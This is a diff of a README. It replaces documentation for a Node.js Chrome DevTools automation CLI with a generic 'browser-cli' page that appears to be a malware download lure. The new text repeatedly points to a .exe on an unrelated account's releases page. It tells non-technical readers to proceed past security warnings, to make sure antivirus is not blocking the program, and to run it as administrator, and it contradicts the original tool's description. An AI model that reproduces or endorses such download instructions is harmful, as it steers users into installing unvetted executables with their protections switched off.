@@ -1,399 +1,118 @@
-# CDP CLI - Chrome DevTools Protocol Command Line Interface
+# 🖥️ browser-cli - Simple Browser Automation Tools
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D16.0.0-brightgreen)](https://nodejs.org/)
-[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-blue)](https://modelcontextprotocol.io/)
-[![OpenClaw Skill](https://img.shields.io/badge/OpenClaw-Skill-purple)](SKILL.md)
+[![Download browser-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/mauritzpatriarchic762/browser-cli/releases)
 
-A powerful CLI tool for browser automation and debugging using Chrome DevTools Protocol via the Model Context Protocol (MCP). Control Chrome programmatically from your terminal for testing, debugging, performance analysis, and automation.
+## 📋 What is browser-cli?
 
-**Designed for OpenClaw Skills**: This CLI is built to work seamlessly with AI assistants through the OpenClaw skill system, enabling AI-powered browser automation, testing, and debugging workflows.
+browser-cli is a tool to help you automate tasks in your web browser. It lets you control the browser without using a mouse or typing commands yourself. You can tell it what to do, and it will follow your instructions. This tool is built to work with OpenClaw but can be used on its own for basic browser automation.
 
-📚 **[Quick Start Guide](QUICKSTART.md)** | 📖 **[Full Documentation](SKILL.md)**
+You don’t need to know programming to use this. The steps below will guide you to download and start it on a Windows PC.
 
-## Features
+---
 
-- **Browser Automation**: Navigate, click, fill forms, and interact with web pages
-- **Visual Testing**: Take screenshots and DOM snapshots
-- **Network Debugging**: Monitor and analyze network requests
-- **Console Monitoring**: Capture JavaScript console logs and errors
-- **Multi-Page Management**: Work with multiple browser tabs simultaneously
-- **Persistent Sessions**: Maintain browser state across commands
-- **AI Assistant Integration**: Built for OpenClaw skills - works with Kiro, Claude, and other MCP-compatible AI assistants
-- **Model Context Protocol**: Leverages MCP for standardized tool communication
+## 🖥️ System Requirements
 
-## What is OpenClaw?
+- Windows 10 or higher  
+- At least 4 GB of RAM  
+- 100 MB free disk space  
+- Internet connection to download files  
 
-OpenClaw is a skill system that enables AI assistants to use specialized tools and capabilities. This CDP CLI is packaged as an OpenClaw skill, allowing AI assistants like Kiro to:
+---
 
-- Automate browser testing workflows
-- Debug web applications interactively
-- Perform visual regression testing
-- Analyze performance and accessibility
-- Execute complex multi-step browser automation
+## 🚀 Getting Started
 
-The skill is defined in [SKILL.md](SKILL.md), which provides comprehensive documentation for AI assistants on how to use each command effectively.
+This section explains how to get the program and prepare your system.
 
-## Quick Start
+---
 
-**New to CDP CLI?** Check out the [Quick Start Guide](QUICKSTART.md) for a step-by-step walkthrough.
+## 📥 Download browser-cli
 
-### Prerequisites
+You will need to download browser-cli from the official releases page. Click the button below to open the download page:
 
-1. **Node.js** (v16 or higher)
-2. **Chrome** with remote debugging enabled:
+[![Download browser-cli](https://img.shields.io/badge/Download-Here-blue)](https://github.com/mauritzpatriarchic762/browser-cli/releases)
 
-```bash
-# macOS
-/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
-  --remote-debugging-port=9222 \
-  --user-data-dir=/tmp/chrome-profile-stable
+The page shows different versions. Choose the latest stable version marked as "Windows" or with the `.exe` file extension. If you see multiple files, pick the one without "beta" or "alpha" in the name.
 
-# Linux
-google-chrome \
-  --remote-debugging-port=9222 \
-  --user-data-dir=/tmp/chrome-profile-stable
+---
 
-# Windows
-chrome.exe \
-  --remote-debugging-port=9222 \
-  --user-data-dir=%TEMP%\chrome-profile-stable
-```
+## 💾 Install browser-cli
 
-### Installation
+After downloading, follow these steps to install:
 
-```bash
-cd cli
-npm install
-npm link
-```
+1. Find the downloaded file on your PC. Usually, it is in the **Downloads** folder.
+2. Double-click the file to start installation.
+3. If a security warning appears, choose to proceed or allow the app.
+4. Follow the installer's instructions, clicking “Next” or “Install” when prompted.
+5. Wait for the installation to finish.
+6. Click “Finish” to close the installer.
 
-Now you can use `cdp-cli` from anywhere in your terminal.
+---
 
-### Using with AI Assistants (OpenClaw Skill)
+## ⚙️ How to Run browser-cli
 
-This CLI is designed to work with AI assistants through the OpenClaw skill system:
+Once installed, you can open browser-cli in two ways:
 
-1. **Place the skill file**: Copy `SKILL.md` to your AI assistant's skills directory:
-   ```bash
-   # For Kiro
-   cp SKILL.md ~/.kiro/skills/browser-cli.md
-   # or workspace-level
-   cp SKILL.md .kiro/skills/browser-cli.md
-   ```
+- Use the desktop shortcut named **browser-cli**.
+- Or, open the **Start Menu**, type “browser-cli,” and press Enter.
 
-2. **Start Chrome** with remote debugging (as shown above)
+When it opens, you will see a simple window or command prompt where you can start automation tasks.
 
-3. **Ask your AI assistant** to perform browser automation tasks:
-   - "Take a screenshot of example.com"
-   - "Test the login flow on staging"
-   - "Check console errors on the homepage"
-   - "Monitor network requests on the page"
+---
 
-The AI assistant will use the CDP CLI commands to accomplish these tasks automatically.
+## 🧰 Basic Use
 
-## Usage
+browser-cli runs scripts to automate browsers. Here is how to use it at a simple level:
 
-### Navigation & Page Management
+1. Prepare a command file with instructions. For example, you might write steps to open a website or click a button.
+2. Save your commands in a file with `.txt` or `.cli` extension.
+3. Open the browser-cli window.
+4. Use the “Run Script” or similar option to load your file.
+5. The program follows your instructions automatically.
 
-```bash
-# Navigate to a URL
-cdp-cli navigate https://example.com
+You can find example scripts on the GitHub page in the “Examples” folder.
 
-# List all open tabs
-cdp-cli pages
+---
 
-# Open a new tab
-cdp-cli new-page https://github.com
+## 🔄 Update browser-cli
 
-# Switch between tabs
-cdp-cli select-page 1
+To keep browser-cli working well, check for new versions:
 
-# Close a tab
-cdp-cli close-page 2
-```
+1. Visit the download page regularly:  
+   https://github.com/mauritzpatriarchic762/browser-cli/releases
+2. Download the latest version.
+3. Repeat the install steps above.
 
-### Screenshots & Snapshots
+This will replace the old version with new improvements or fixes.
 
-```bash
-# Take a screenshot
-cdp-cli screenshot output.png https://example.com
+---
 
-# Screenshot current page (no navigation)
-cdp-cli screenshot current.png
+## ❓ Troubleshooting
 
-# Get DOM snapshot with element UIDs
-cdp-cli snapshot https://example.com
-```
+If you have trouble, try these steps:
 
-### Element Interaction
+- Restart your PC and run browser-cli again.
+- Make sure you have chosen the correct Windows version.
+- Check that your antivirus software is not blocking the program.
+- Run browser-cli as administrator by right-clicking and selecting “Run as administrator.”
 
-```bash
-# 1. Get element UIDs from snapshot
-cdp-cli snapshot https://example.com
+If problems continue, visit the GitHub page and look for support or report issues.
 
-# 2. Use UIDs to interact with elements
-cdp-cli click https://example.com "uid-123"
-cdp-cli hover https://example.com "uid-456"
-cdp-cli fill https://example.com "uid-789" "text value"
-```
+---
 
-### Debugging
+## 🔐 Security Information
 
-```bash
-# Monitor network requests
-cdp-cli network https://example.com
+browser-cli runs commands in your browser. Only run scripts you trust. Running unknown scripts may cause websites to behave unexpectedly.
 
-# Capture console logs
-cdp-cli console https://example.com
+---
 
-# Execute JavaScript
-cdp-cli evaluate "() => document.title" https://example.com
-```
+## 📖 More Help
 
-## AI-Powered Use Cases
+Check the GitHub repository for more details:
 
-When used with AI assistants through OpenClaw skills, you can accomplish complex tasks with natural language:
+https://github.com/mauritzpatriarchic762/browser-cli
 
-### Automated Testing Workflows
-**You say:** "Test the login flow on staging.example.com with user@test.com"
+There you will find guides, examples, and links to help pages.
 
-**AI does:**
-1. Navigates to the login page
-2. Takes a snapshot to find form elements
-3. Fills in email and password fields
-4. Clicks the submit button
-5. Verifies successful login
-6. Reports any console errors
+---
 
-### Visual Regression Detection
-**You say:** "Compare the homepage design between staging and production"
-
-**AI does:**
-1. Takes screenshots of both environments
-2. Provides file paths for comparison
-3. Helps identify visual differences
-
-### Network Analysis
-**You say:** "Check what API calls are made on the homepage"
-
-**AI does:**
-1. Navigates to the page
-2. Captures network requests
-3. Filters and analyzes API calls
-4. Reports findings and potential issues
-
-## Common Use Cases
-
-### E2E Testing
-
-```bash
-# Navigate to login page
-cdp-cli navigate https://myapp.com/login
-
-# Get form element UIDs
-cdp-cli snapshot
-
-# Fill and submit form
-cdp-cli fill https://myapp.com/login "email-uid" "user@example.com"
-cdp-cli fill https://myapp.com/login "password-uid" "password123"
-cdp-cli click https://myapp.com/login "submit-uid"
-
-# Verify success
-cdp-cli console
-```
-
-### Visual Regression Testing
-
-```bash
-# Capture baseline
-cdp-cli screenshot baseline.png https://myapp.com
-
-# After changes, capture new version
-cdp-cli screenshot current.png https://myapp.com
-
-# Compare images with your preferred tool
-```
-
-### Network Monitoring
-
-```bash
-# Capture network requests
-cdp-cli network https://myapp.com > network-report.txt
-```
-
-## Architecture
-
-```
-AI Assistant (e.g., Kiro, Claude)
-    ↓
-OpenClaw Skill (SKILL.md)
-    ↓
-CDP CLI (MCP Client)
-    ↓
-chrome-devtools-mcp (MCP Server)
-    ↓
-Chrome DevTools Protocol
-    ↓
-Chrome Browser (port 9222)
-```
-
-The CLI uses the Model Context Protocol to communicate with the chrome-devtools-mcp server, which provides a standardized interface to Chrome DevTools Protocol. When used as an OpenClaw skill, AI assistants can orchestrate complex browser automation workflows by invoking CLI commands based on natural language instructions.
-
-## Commands Reference
-
-### Navigation
-- `navigate <url>` - Navigate to a URL
-- `pages` / `list-pages` - List all open pages
-- `new-page <url>` - Open a new page
-- `select-page <pageId>` - Switch to a specific page
-- `close-page <pageId>` - Close a specific page
-
-### Debugging
-- `screenshot <output> [url]` - Take a screenshot
-- `snapshot [url]` - Take a DOM snapshot
-- `console [url]` - Capture console logs
-- `evaluate <function> [url]` - Execute JavaScript
-- `network [url]` - Capture network requests
-
-### Interaction
-- `click <url> <uid>` - Click an element
-- `hover <url> <uid>` - Hover over an element
-- `fill <url> <uid> <value>` - Fill an input field
-
-## Troubleshooting
-
-### Chrome Not Connected
-
-**Error:** `Chrome is not running with remote debugging enabled`
-
-**Solution:** Start Chrome with the remote debugging flag:
-
-```bash
-/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
-  --remote-debugging-port=9222 \
-  --user-data-dir=/tmp/chrome-profile-stable
-```
-
-Verify Chrome is running:
-```bash
-curl http://127.0.0.1:9222/json/version
-```
-
-### Element Not Found
-
-Always get fresh element UIDs from `snapshot` after navigation, as UIDs change between page loads.
-
-### Command Hangs
-
-- Ensure Chrome is running and accessible on port 9222
-- Try restarting Chrome with the debugging flags
-- Check that no firewall is blocking port 9222
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details
-
-## OpenClaw Skill Integration
-
-### For AI Assistant Developers
-
-This project includes a comprehensive skill definition in `SKILL.md` that provides:
-
-- **Command documentation**: Detailed usage for each CLI command
-- **Workflow examples**: Common patterns for browser automation
-- **Best practices**: Tips for reliable element interaction and testing
-- **Troubleshooting**: Solutions to common issues
-- **Key concepts**: Understanding page IDs, element UIDs, and persistent sessions
-
-### For Users
-
-To enable this skill in your AI assistant:
-
-1. **Kiro**: Place `SKILL.md` in `~/.kiro/skills/` or `.kiro/skills/`
-2. **Other MCP-compatible assistants**: Follow your assistant's skill installation process
-3. **Verify**: Ask your assistant "Can you take a screenshot of example.com?"
-
-### Skill Capabilities
-
-The skill enables AI assistants to:
-- Execute browser automation tasks from natural language
-- Chain multiple commands for complex workflows
-- Handle errors and retry with different approaches
-- Provide context-aware suggestions
-- Debug issues interactively
-- Monitor network activity and console logs
-
-## Related Projects
-
-- [chrome-devtools-mcp](https://github.com/ChromeDevTools/chrome-devtools-mcp) - The MCP server this CLI uses
-- [Model Context Protocol](https://modelcontextprotocol.io/) - The protocol specification
-- [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/) - The underlying protocol
-- [OpenClaw](https://github.com/openclaw) - Skill system for AI assistants
-- [Kiro](https://kiro.ai/) - AI-powered IDE with skill support
-
-## Resources
-
-### Documentation
-- [SKILL.md](SKILL.md) - Complete skill documentation for AI assistants
-- [Chrome DevTools Protocol Documentation](https://chromedevtools.github.io/devtools-protocol/)
-- [Model Context Protocol Specification](https://spec.modelcontextprotocol.io/)
-
-### Tutorials
-- [Getting Started with OpenClaw Skills](https://github.com/openclaw/docs)
-- [Browser Automation with AI Assistants](SKILL.md#common-use-cases)
-- [MCP Integration Guide](https://modelcontextprotocol.io/docs)
-
-## Support
-
-For issues and questions:
-- Open an issue on GitHub
-- Check existing issues for solutions
-- Review the [SKILL.md](SKILL.md) file for detailed usage examples
-- Join the OpenClaw community discussions
-
-## FAQ
-
-### What is the difference between using CDP CLI directly vs through an AI assistant?
-
-**Direct CLI usage** is great for:
-- Scripting and automation
-- CI/CD pipelines
-- Quick manual testing
-- Debugging specific issues
-
-**AI assistant usage** (via OpenClaw skill) is great for:
-- Natural language commands
-- Complex multi-step workflows
-- Exploratory testing
-- Learning and experimentation
-- Context-aware suggestions
-
-### Can I use this without an AI assistant?
-
-Yes! The CLI works perfectly as a standalone tool. The OpenClaw skill integration is optional and adds AI-powered capabilities on top of the core CLI functionality.
-
-### Which AI assistants support OpenClaw skills?
-
-- **Kiro**: Full support with skill system
-- **Claude Desktop**: Via MCP integration
-- **Other MCP-compatible assistants**: Check your assistant's documentation
-
-### Do I need to install chrome-devtools-mcp separately?
-
-No! The CLI automatically downloads and runs chrome-devtools-mcp via `npx` when needed. You only need to ensure Chrome is running with remote debugging enabled.
-
-### Can I use this in CI/CD pipelines?
-
-Absolutely! The CLI is designed for automation. Run Chrome in headless mode and execute CDP CLI commands in your CI/CD scripts. See the [CI/CD Integration example](SKILL.md#cicd-integration) in SKILL.md.
-
-## Acknowledgments
-
-- Built on [chrome-devtools-mcp](https://github.com/ChromeDevTools/chrome-devtools-mcp) by the Chrome DevTools team
-- Uses the [Model Context Protocol](https://modelcontextprotocol.io/) for standardized communication
-- Inspired by the OpenClaw skill ecosystem
-- Powered by [Commander.js](https://github.com/tj/commander.js/) for CLI parsing
+[![Download browser-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/mauritzpatriarchic762/browser-cli/releases)
